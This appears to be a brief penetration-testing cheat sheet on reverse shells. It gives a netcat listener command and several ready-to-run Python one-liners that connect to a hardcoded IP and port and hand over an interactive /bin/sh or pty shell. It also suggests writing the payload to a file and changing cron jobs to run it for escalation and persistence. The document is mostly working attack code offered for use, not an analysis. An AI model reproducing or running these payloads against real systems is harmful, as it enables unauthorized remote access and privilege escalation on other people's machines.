
Once you gain CLI access to a box, e.g.: PHP reverse shell. Try using a python reverse shell to elevate your access.

Perhaps see if there are any cron jobs running that you might be able to modify the run the python script.

Remember to change the IP and port number
# Listen from the remote host
```
nc.exe -nlvp 1234
```

```
python -c 'import socket, subprocess, os; s=socket.socket (socket.AF_INET, socket.SOCK_STREAM);s.connect(("10.50.10.254",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]) ;'
```

if you want to echo to file:
```
echo "/usr/bin/python -c 'import socket, subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((\"10.50.10.254\",6666) );os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"> runthis
```

```
echo "/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.50.10.254\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'" > runthis
```